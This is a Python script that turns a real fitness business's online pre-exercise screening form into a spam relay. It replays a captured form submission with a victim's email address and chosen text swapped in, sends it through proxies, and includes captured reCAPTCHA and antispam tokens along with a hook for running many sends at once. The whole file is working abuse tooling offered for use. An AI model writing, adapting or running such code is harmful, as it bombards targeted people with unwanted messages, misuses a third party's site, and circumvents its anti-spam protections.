from os.path import basename

import requests

import module

'''
curl 'https://www.eyeofthetigerfitness.com.au/adult-pre-exercise-screening-system/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRXnHAqfGTTMm5xen' \
  -H 'Cookie: wpcw_timezone=Europe/Kiev; _ga_L22EN0L2VD=GS1.1.1676307370.5.0.1676307370.0.0.0; _ga=GA1.3.1101226089.1675331083; _gid=GA1.3.462830345.1676307373; _gat_gtag_UA_150416879_1=1' \
  -H 'Origin: https://www.eyeofthetigerfitness.com.au' \
  -H 'Referer: https://www.eyeofthetigerfitness.com.au/adult-pre-exercise-screening-system/' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="frm_action"\r\n\r\ncreate\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="form_id"\r\n\r\n11\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="frm_hide_fields_11"\r\n\r\n\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="form_key"\r\n\r\nadultpre-exercisescreeningsystem2\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[0]"\r\n\r\n\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="frm_submit_entry_11"\r\n\r\na3906dd18f\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="_wp_http_referer"\r\n\r\n/adult-pre-exercise-screening-system/\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[102]"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[103]"\r\n\r\n17/02/2023\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[104]"\r\n\r\ntest\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[105]"\r\n\r\n22/06/1999\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[106]"\r\n\r\nPrefer not to say\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[other][106]"\r\n\r\n\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[107]"\r\n\r\nYes\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[108]"\r\n\r\nYes\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[109]"\r\n\r\nYes\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[110]"\r\n\r\nYes\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[111]"\r\n\r\nYes\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[112]"\r\n\r\nYes\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[115][typed]"\r\n\r\n\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_meta[115][output]"\r\n\r\ndata:image/png;base64,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\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n03AFY_a8XaTRqBVMJI4Vb8o-l9vGENEzgp2K5yqwcIUqY02UJb_ECdNCJe5524InaPwrLp4wtjK-H3FeTQI6pMNpRxBix6nsgNGBSUJ7cwxC51RWh8sGHYaKy_Kd93r69wHb6oF-MGvUEh7CJVGe8P4kHG1twWllOBFLg51y6nqVv189tzRqhvWIZTZZ1AxNKXNfeIBWm23GkHGGbXKUYEv3hNioJfkX4KLlnv5PWI-68oQNW54o6F5qFlTmFeXLOKa-TN2g9F58Co37jah4xpOQjbRFMAXCqT_oy-PQpttODRbTc1ryCjhmGQWQWBDFPN3OXX6dmYElc-drZDMFCOL_eLG3fujowa-BMmRcEVTNGi23Pep6v40-JJEWZx2UhqLoAol4tu8Aj-ukliZ4U2u8qMerX00CvuEXz4yW4hLbcaA9MZqTTfNDxAgHdi5ggCA699tmRyafhGOZShltOn8xjuIDwgjGmO90CeEE5KgUEOBVYLevb4VV_0rrvbX0bYhlOSLPNGfMtkm4ONMAJo-NFdPqUuikTzfg\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="item_key"\r\n\r\n\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="frm_verify"\r\n\r\n\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="frm_state"\r\n\r\nXwacx0cIhIUONb6isFDv8ebRGKo1UDexT5SpU17awR4=\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen\r\nContent-Disposition: form-data; name="antispam_token"\r\n\r\n7629b9db7ade9ea15c804070cb54a781\r\n------WebKitFormBoundaryRXnHAqfGTTMm5xen--\r\n' \
  --compressed
'''


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            'wpcw_timezone': 'Europe/Kiev',
            '_gid': 'GA1.3.449841643.1675681288',
            '_ga_L22EN0L2VD': 'GS1.1.1675690883.3.0.1675690883.0.0.0',
            '_ga': 'GA1.3.1101226089.1675331083',
            '_gat_gtag_UA_150416879_1': '1',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryyiNhc7MtPA39Avg0',
            'Origin': 'https://www.eyeofthetigerfitness.com.au',
            'Referer': 'https://www.eyeofthetigerfitness.com.au/adult-pre-exercise-screening-system/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = '------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_action"\r\n\r\ncreate\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="form_id"\r\n\r\n11\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_hide_fields_11"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="form_key"\r\n\r\nadultpre-exercisescreeningsystem2\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[0]"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_submit_entry_11"\r\n\r\n5f545076a5\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="_wp_http_referer"\r\n\r\n/adult-pre-exercise-screening-system/\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[102]"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[103]"\r\n\r\n28/02/2023\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[104]"\r\n\r\ntest\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[105]"\r\n\r\n07/06/2001\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[106]"\r\n\r\nPrefer not to say\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[other][106]"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[107]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[108]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[109]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[110]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[111]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[112]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[113]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[115][typed]"\r\n\r\nsign\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[115][output]"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[116]"\r\n\r\n546\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_key"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_verify"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_state"\r\n\r\nXwacx0cIhIUONb6isFDv8ebRGKo1UDexT5SpU17awR4=\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text(target=target))
        response = requests.post(
            'https://www.eyeofthetigerfitness.com.au/adult-pre-exercise-screening-system/',
            cookies=cookies,
            headers=headers,
            data=data.encode(),
            proxies=self.get_proxies(), timeout=30
        )
        return response


def main():
    s = 'Thanks for completing the screening questionnaire'

    spam = ConcreteSpam(basename(__file__)[:-3], s)
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently(15)


if __name__ == '__main__':
    main()
